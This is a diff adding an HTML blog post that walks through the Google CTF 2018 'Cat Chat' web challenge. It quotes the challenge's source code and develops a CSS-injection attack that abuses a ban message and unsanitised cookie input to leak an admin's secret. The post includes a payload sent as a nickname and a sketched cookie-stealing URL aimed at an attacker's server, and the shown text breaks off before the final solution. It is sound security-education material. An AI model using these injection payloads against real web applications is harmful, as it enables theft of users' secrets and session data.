@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Cat Chat Google-CTF &#39;18 Writeup</title>
+  <meta property="og:title" content="Cat Chat Google-CTF &#39;18 Writeup" />
+  <meta name="twitter:title" content="Cat Chat Google-CTF &#39;18 Writeup" />
+  <meta name="description" content="Task URL : Cat Chat Team:NULLKrypt3rs Solves :46 Type : Web Note : Files here">
+  <meta property="og:description" content="Task URL : Cat Chat Team:NULLKrypt3rs Solves :46 Type : Web Note : Files here">
+  <meta name="twitter:description" content="Task URL : Cat Chat Team:NULLKrypt3rs Solves :46 Type : Web Note : Files here">
+  <meta name="author" content="Aseem Shrey"/>
+  <link href='https://lud1161.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta property="og:image" content="https://lud1161.github.io/img/avatar-icon.png" />
+  <meta name="twitter:image" content="https://lud1161.github.io/img/avatar-icon.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@LuD1161" />
+  <meta name="twitter:creator" content="@LuD1161" />
+  <meta property="og:url" content="https://lud1161.github.io/posts/2018-07-02-cat-chat-googlectf-writeup/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="LuD1161&#39;s Blog" />
+
+  <meta name="generator" content="Hugo 0.42.1" />
+  <link rel="canonical" href="https://lud1161.github.io/posts/2018-07-02-cat-chat-googlectf-writeup/" />
+  <link rel="alternate" href="https://lud1161.github.io/index.xml" type="application/rss+xml" title="LuD1161&#39;s Blog">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://lud1161.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://lud1161.github.io/css/syntax.css" /><link rel="stylesheet" href="https://lud1161.github.io/css/codeblock.css" />
+<link rel="stylesheet" type="text/css" href="/css/glitches.css" />
+<script type="text/javascript" href="/js/jquery-glitch.js"/></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.3/jquery.min.js"></script>
+<script>
+    $(".glitch").glitch({
+        layers: ["yellow", "blue"],
+        offset: [15, 10],
+    });
+</script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-121714095-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand glitch" data-text="LuD1161&#39;s Blog" href="https://lud1161.github.io/">LuD1161&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="~/about" href="/">~/about</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="~/posts" href="/posts/">~/posts</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    <div class="avatar-container">
+      <div class="avatar-img-border">
+        
+          <a title="LuD1161&#39;s Blog" href="https://lud1161.github.io/">
+            <img class="avatar-img" src="https://lud1161.github.io/img/avatar-icon.png" alt="LuD1161&#39;s Blog" />
+          </a>
+        
+      </div>
+    </div>
+
+  </div>
+</nav>
+
+
+
+
+    
+  
+  
+  
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="posts-heading">
+              <h1>Cat Chat Google-CTF &#39;18 Writeup</h1>
+                
+                
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        
+
+<p><kbd><strong>Task URL</strong> : <em>Cat Chat</em>    <strong>Team</strong>:<a href="https://ctftime.org/team/45761">NULLKrypt3rs</a>     <strong>Solves</strong> :<em>46</em>   <strong>Type</strong> : <em>Web</em>     <strong>Note</strong> : Files  <a href="https://gist.github.com/LuD1161/ac97c0e2f09cd98d96dc720c6fe2fcb2">here</a></p>
+
+<p><strong>The Problem Statement</strong> :</p>
+
+<p>It&rsquo;s a chat room based on node js, where you&rsquo;re strictly not allowed any &ldquo;dog&rdquo; talk.</p>
+
+
+<link rel="stylesheet" href="/css/hugo-easy-gallery.css" />
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://lud1161.files.wordpress.com/2018/06/cat-chat.png" alt="The Problem Statement"/>
+    </div>
+      <figcaption>
+          <p>The Problem Statement</p>
+      </figcaption>
+    <a href="https://lud1161.files.wordpress.com/2018/06/cat-chat.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+
+<p>Following is the page you get on clicking on the link ( the room could be different for each one of you ).</p>
+
+
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://lud1161.files.wordpress.com/2018/06/front-page.png" alt="Front Page"/>
+    </div>
+      <figcaption>
+          <p>Front Page</p>
+      </figcaption>
+    <a href="https://lud1161.files.wordpress.com/2018/06/front-page.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+
+<h2 id="initial-analysis">Initial Analysis</h2>
+
+<p>The first thing I do on a web challenge is check it&rsquo;s source and then check every functionality of the web app, while passing it through a proxy ( preferably Burp suite ), just to check some hidden headers etc . The proxy helps in analysing requests later , as it&rsquo;s saved in it&rsquo;s history.</p>
+
+<p>The source did have some <em>hidden admin functionality</em>, commented in the source.</p>
+
+<p>Apart from this we had the source of the application, namely <em>server.js,</em> poking around, there was one more file <em>catchat.js</em>.</p>
+
+<p>The second rule states the following :</p>
+
+<blockquote>
+<ul>
+<li>Dog talk is strictly forbidden. If you see anyone talking about dogs, please report the incident, and the admin will take the appropriate steps. <strong>This usually means that the admin joins the room, listens to the conversation for a brief period and bans anyone who mentions dogs.</strong></li>
+</ul>
+</blockquote>
+
+<p>You can notice the text I made bold. So, the admin also comes to the chat, sounds interesting.</p>
+
+<p>Other basic functionality :</p>
+
+<blockquote>
+<p><code>/name YourNewName</code> - Change your nick name to YourNewName.
+  <code>/report</code> - Report dog talk to the admin.</p>
+</blockquote>
+
+<p>Like irc you could issue these commands, so let&rsquo;s now take a deep dive.</p>
+
+<h2 id="the-hunt-begins">The Hunt Begins</h2>
+
+<p>Looking into the source <strong><em>server.js</em></strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">switch</span> <span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^\/[^ ]*/</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
+   <span class="k">case</span> <span class="s1">&#39;/name&#39;</span><span class="o">:</span>
+     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">arg</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/\/name (.+)/</span><span class="p">)))</span> <span class="k">break</span><span class="p">;</span>
+     <span class="nx">response</span> <span class="o">=</span> <span class="p">{</span><span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;rename&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="nx">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]};</span>
+     <span class="nx">broadcast</span><span class="p">(</span><span class="nx">room</span><span class="p">,</span> <span class="p">{</span><span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="nx">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nx">old</span><span class="o">:</span> <span class="nx">name</span><span class="p">});</span>
+   <span class="k">case</span> <span class="s1">&#39;/ban&#39;</span><span class="o">:</span>
+     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">arg</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/\/ban (.+)/</span><span class="p">)))</span> <span class="k">break</span><span class="p">;</span>
+     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">admin</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+     <span class="nx">broadcast</span><span class="p">(</span><span class="nx">room</span><span class="p">,</span> <span class="p">{</span><span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;ban&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="nx">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]});</span>
+   <span class="k">case</span> <span class="s1">&#39;/secret&#39;</span><span class="o">:</span>
+     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">arg</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/\/secret (.+)/</span><span class="p">)))</span> <span class="k">break</span><span class="p">;</span>
+     <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s1">&#39;Set-Cookie&#39;</span><span class="p">,</span> <span class="s1">&#39;flag=&#39;</span> <span class="o">+</span> <span class="nx">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;; Path=/; Max-Age=31536000&#39;</span><span class="p">);</span>
+     <span class="nx">response</span> <span class="o">=</span> <span class="p">{</span><span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;secret&#39;</span><span class="p">};</span>
+   <span class="k">case</span> <span class="s1">&#39;/report&#39;</span><span class="o">:</span>
+     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">arg</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/\/report (.+)/</span><span class="p">)))</span> <span class="k">break</span><span class="p">;</span>
+     <span class="kd">var</span> <span class="nx">ip</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="s1">&#39;x-forwarded-for&#39;</span><span class="p">];</span>
+     <span class="nx">ip</span> <span class="o">=</span> <span class="nx">ip</span> <span class="o">?</span> <span class="nx">ip</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">connection</span><span class="p">.</span><span class="nx">remoteAddress</span><span class="p">;</span>
+     <span class="nx">response</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">admin</span><span class="p">.</span><span class="nx">report</span><span class="p">(</span><span class="nx">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nx">ip</span><span class="p">,</span> <span class="sb">`https://</span><span class="si">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">host</span><span class="si">}</span><span class="sb">/room/</span><span class="si">${</span><span class="nx">room</span><span class="si">}</span><span class="sb">/`</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>A few things to notice here :</p>
+
+<ol>
+<li><strong>CSP</strong> : You can&rsquo;t just ignore this :p.</li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
+ <span class="s1">&#39;Content-Security-Policy&#39;</span><span class="o">:</span> <span class="p">[</span>
+ <span class="s1">&#39;default-src \&#39;self\&#39;&#39;</span><span class="p">,</span>
+ <span class="s1">&#39;style-src \&#39;unsafe-inline\&#39; \&#39;self\&#39;&#39;</span><span class="p">,</span>
+ <span class="s1">&#39;script-src \&#39;self\&#39; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/&#39;</span><span class="p">,</span>
+ <span class="s1">&#39;frame-src \&#39;self\&#39; https://www.google.com/recaptcha/&#39;</span><span class="p">,</span>
+ <span class="p">].</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;; &#39;</span><span class="p">)</span>
+<span class="p">},</span>
+</code></pre></div>
+<p>I didn&rsquo;t quite understood csp before, I read about it on <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP MDN</a>. So, it basically says you could add inline style sources and possibly <a href="https://stackoverflow.com/a/31759553">cross style styling attack</a>.</p>
+
+<ol>
+<li><p>Every command needs atleast one argument, ( which is separated by a space after the command ) and is aptly called <code>arg[1]</code></p></li>
+
+<li><p>In the <em>secret</em> command you can notice the input is straightaway put into the cookie, <strong>no input sanitisation</strong>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">case</span> <span class="s1">&#39;/secret&#39;</span><span class="o">:</span>
+	 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">arg</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/\/secret (.+)/</span><span class="p">)))</span> <span class="k">break</span><span class="p">;</span>
+	 <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s1">&#39;Set-Cookie&#39;</span><span class="p">,</span> <span class="s1">&#39;flag=&#39;</span> <span class="o">+</span> <span class="nx">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;; Path=/; Max-Age=31536000&#39;</span><span class="p">);</span>
+	 <span class="nx">response</span> <span class="o">=</span> <span class="p">{</span><span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;secret&#39;</span><span class="p">};</span>
+</code></pre></div>
+<p>So, maybe it would be useful later.</p></li>
+
+<li><p>There is one line in <em>report</em> command, I don&rsquo;t know what it is used for, cause the <em>admin.report</em> functionality is not known yet ( and won&rsquo;t be later :p ).</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">ip</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="s1">&#39;x-forwarded-for&#39;</span><span class="p">];</span>
+</code></pre></div></li>
+
+<li><p><strong>report</strong> endpoint takes recaptcha&rsquo;s token as the first parameter</p></li>
+</ol>
+
+<p>Now looking into <em>catchat.js</em></p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">// Utility functions
+</span><span class="c1"></span><span class="kd">let</span> <span class="nx">cookie</span> <span class="o">=</span> <span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="sb">`(?:^|; )</span><span class="si">${</span><span class="nx">name</span><span class="si">}</span><span class="sb">=(.*?)(?:$|;)`</span><span class="p">))</span> <span class="o">||</span> <span class="p">[])[</span><span class="mi">1</span><span class="p">];</span>
+<span class="kd">let</span> <span class="nx">esc</span> <span class="o">=</span> <span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;/g</span><span class="p">,</span> <span class="s1">&#39;&amp;lt;&#39;</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&gt;/g</span><span class="p">,</span> <span class="s1">&#39;&amp;gt;&#39;</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&#34;/g</span><span class="p">,</span> <span class="s1">&#39;&amp;quot;&#39;</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&#39;/g</span><span class="p">,</span> <span class="s1">&#39;&amp;apos;&#39;</span><span class="p">);</span>
+<span class="o">~~~</span> <span class="nx">SNIP</span> <span class="o">~~~</span>
+
+<span class="nx">ban</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="s1">&#39;banned=1; Path=/&#39;</span><span class="p">;</span>
+    <span class="nx">sse</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+    <span class="nx">display</span><span class="p">(</span><span class="sb">`You have been banned and from now on won&#39;t be able to receive and send messages.`</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">display</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">esc</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span><span class="si">}</span><span class="sb"> was banned.&lt;style&gt;span[data-name^=</span><span class="si">${</span><span class="nx">esc</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span><span class="si">}</span><span class="sb">] { color: red; }&lt;/style&gt;`</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">},</span>
+
+<span class="o">~~~</span> <span class="nx">SNIP</span> <span class="o">~~~</span>
+
+<span class="c1">// Admin helper function. Invoke this to automate banning people in a misbehaving room.
+</span><span class="c1">// Note: the admin will already have their secret set in the cookie (it&#39;s a cookie with long expiration),
+</span><span class="c1">// so no need to deal with /secret and such when joining a room.
+</span><span class="c1"></span></code></pre></div>
+<ol>
+<li>This <strong>esc</strong> functionality is used to replace &lsquo;<em>&lsquo;</em>&rsquo; , &lsquo;<em>&ldquo;</em>&rsquo; , &lsquo;&lt;&rsquo; and &lsquo;&gt;&rsquo; to their <a href="https://www.w3schools.com/html/html_entities.asp">html entities</a>, thus preventing <strong>XSS</strong>, so maybe we have to extract something out of admin .</li>
+<li><strong>ban</strong> function just adds a <em>banned=1</em> cookie, thus removing it would unban us perhaps.</li>
+<li>A style tag is added with color as <strong>red</strong> when you&rsquo;re banned, here maybe we can use <em>CSS injection</em>.</li>
+<li>Admin will have their secret set , hmmm, sounds interesting ( mental note: will check it )</li>
+</ol>
+
+<h2 id="further-functionality-testing">Further Functionality Testing</h2>
+
+<p>Okay now we dive into the application.</p>
+
+<p>Join a chat room and start chatting.</p>
+
+<p>Some things I tested out :</p>
+
+<ol>
+<li>Change name to dog, this won&rsquo;t ban you</li>
+<li>Try the <strong>/secret</strong> command</li>
+<li>Try basic XSS payload, none of it works as all have either single/double quote or angular brackets which are escaped by the <strong>esc</strong> function as seen earlier</li>
+</ol>
+
+
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://lud1161.files.wordpress.com/2018/06/basic_testing.png" alt="Basic Command Testing"/>
+    </div>
+      <figcaption>
+          <p>Basic Command Testing</p>
+      </figcaption>
+    <a href="https://lud1161.files.wordpress.com/2018/06/basic_testing.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+
+<p>I took the <em>deleteAllCookies</em> code from <a href="https://stackoverflow.com/a/179514">here</a> and added a <em>Path</em> parameter to delete the <em>banned=1</em> cookie.</p>
+
+<p>You can see the <em>flag</em> cookie too, in the console window right side, it&rsquo;s the secret I set using the <strong>/secret</strong> command.</p>
+
+<p>The <em>secret</em> is also visible ( it&rsquo;s only visible, when you hover over it) in the chat window, however it&rsquo;s only visible when you hover over it , it&rsquo;s in a <em>span</em> with attribute name <em>data-secret</em> ( as you can see in the screenshot below ).</p>
+
+
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://lud1161.files.wordpress.com/2018/06/secret_span.png" alt="Secret in span"/>
+    </div>
+      <figcaption>
+          <p>Secret in span</p>
+      </figcaption>
+    <a href="https://lud1161.files.wordpress.com/2018/06/secret_span.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+
+<h3 id="conclusions">Conclusions :</h3>
+
+<ol>
+<li>&ldquo;<strong>dog</strong> &ldquo; in your name doesn&rsquo;t ban you</li>
+<li><strong>/secret</strong> sets the <em>flag</em> cookie and outputs on the chat window in a hidden form</li>
+<li>Every <em>XSS</em> payload ( atleast which I knew ) is escaped</li>
+<li>The flag cookie only outputs when <strong>secret</strong> command is issued</li>
+</ol>
+
+<h2 id="plan-of-action">Plan of Action</h2>
+
+<p>So, upto now 1-2 hour had passed, with me looking into the question. Now, I was getting the hang of question as to what needs to be done. Steps to do :</p>
+
+<ol>
+<li>Invite admin to chat ( done )</li>
+<li>Execute <strong>/secret</strong> without changing the <em>flag</em> cookie ( will require some work )</li>
+<li>Steal the flag cookie from the admin&rsquo;s chat ( will require some work )</li>
+</ol>
+
+<p>Okay, so looking at the steps above , during the CTF actually I did find the solution to 3rd problem before the 2nd one.</p>
+
+<p>It was CSS injection in the <strong>ban</strong> function and extracting data through it, I and one of my friend was working together and it was his idea of CSS injection . <a href="https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html">Here&rsquo;s</a> a great blogpost about it.</p>
+
+<p>Okay, I tried this, starting with color changing and later to <em>data exfil</em>. In the below screenshot on the right side I have another user which is going to be banned and I&rsquo;m using the name parameter to do CSS injection. No badchars ( single/double quotes or angular brackets ) in the name. After the injection you can see the injection being executed and color on the left window changes.</p>
+
+
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://lud1161.files.wordpress.com/2018/06/color_change.png" alt="CSS Injection"/>
+    </div>
+      <figcaption>
+          <p>CSS Injection</p>
+      </figcaption>
+    <a href="https://lud1161.files.wordpress.com/2018/06/color_change.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+
+<p>Wait instead of changing color in css why not directly execute js there and get the cookie :</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">background</span><span class="o">:</span><span class="nx">url</span><span class="p">(</span><span class="nx">attacker</span><span class="err">&#39;</span><span class="nx">s</span> <span class="nx">server</span><span class="err">/?cookies=+document.cookie)</span>
+</code></pre></div>
+<p>The above statement has two flaws in it, one should be staring at your face, <strong>YOU CAN&rsquo;T EXECUTE JAVASCIPT INTO CSS, WHY SHOULD THE BROWSER EVEN DO THAT</strong>
+This js thing ( <code>document.cookie</code> ) was pointed to me by one of the admins.
+The other one quite subtle, perhaps you forgot the CSP, it has default set to <code>self</code> which means nothing can be set from anywhere else, except the domain itself.</p>
+
+<p>That is when I realized to use the 2nd method mentioned in the <a href="https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html">aforementioned blogpost</a> , <em>abusing CSS attribute selectors</em> for &ldquo;<em><strong>Reading Data via CSS</strong></em>&rdquo;.</p>
+
+<p>Well now, I have a method to exfil data but what to exfil from ?<br />
+Perhaps from data-secret attribute of the span tag</p>
+
+<p>If the admin has his/her data-secret set then it can be done, easy peasy , is it ?</p>
+
+<p>Can&rsquo;t the admin be so kind to do it for me ( LoL :p )</p>
+
+<p>However, I have to find some way so that data-secret comes into admin&rsquo;s chat and I could steal it.</p>
+
+<p>Let&rsquo;s account for the bugs we know of :</p>
+
+<ol>
+<li><p>CSS injection , <em>background:url()</em></p></li>
+
+<li><p>No input sanitisation in cookie when secret command is issued</p></li>
+</ol>
+
+<p>Okay so <em>CSS injection</em> can be used to run any command on admin&rsquo;s chat if I set the <em>url</em> accordingly, like this</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="err">/name leaker ] {background:url(/room/84b4b69a-d01d-45c3-b2c5-eb5d55abd734/send?name=LuD1161&amp;msg=admin_code_exec);}</span>
+</code></pre></div>
+<p>The name <em>LuD1161</em> comes because it&rsquo;s in the <em>name</em> parameter of the url.</p>
+
+
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://lud1161.files.wordpress.com/2018/06/message_sending.png" alt="Message Code Execution"/>
+    </div>
+      <figcaption>
+          <p>Message Code Execution</p>
+      </figcaption>
+    <a href="https://lud1161.files.wordpress.com/2018/06/message_sending.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+
+<p>Okay, so the first hypothesis tested, now I have a way to send message from the admin, which is what I will use to exfil the flag out of admin.</p>
+
+<p>So, now how do you get flag onto the chat window of admin, cause CSS injection cannot extract cookies.</p>
+
+<p>Well only way is if we could get the flag in chat window and that can only be done using <strong>/secret</strong> command but then it will change the flag, hmmm.</p>
+
+<p>Somehow, I have to execute the <strong>/secret</strong> and not change the flag, here I was stuck for sometime, then someone told me to look into the &ldquo;<strong>set-headers</strong> options of cookie&rdquo;, well I looked upon it on <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Examples">MDN</a> and reality dawned upon me, the answer was staring right into my face there. It stated :</p>
+
+<blockquote>
+<h3 id="invalid-domains">Invalid domains</h3>
+
+<p>A cookie belonging to a domain that does not include the origin server <a href="https://tools.ietf.org/html/rfc6265#section-4.1.2.3">should be rejected by the user agent</a>. The following cookie will be rejected if it was set by a server hosted on originalcompany.com.</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"> <span class="nx">Set</span><span class="o">-</span><span class="nx">Cookie</span><span class="o">:</span> <span class="nx">qwerty</span><span class="o">=</span><span class="mi">219</span><span class="nx">ffwef9w0f</span><span class="p">;</span> <span class="nx">Domain</span><span class="o">=</span><span class="nx">somecompany</span><span class="p">.</span><span class="nx">co</span><span class="p">.</span><span class="nx">uk</span><span class="p">;</span> <span class="nx">Path</span><span class="o">=</span><span class="err">/; Expires=Wed, 30 Aug 2019 00:00:00 GMT</span>
+</code></pre></div></blockquote>
+
+<p>That&rsquo;s all I need , I was so happy :)</p>
+
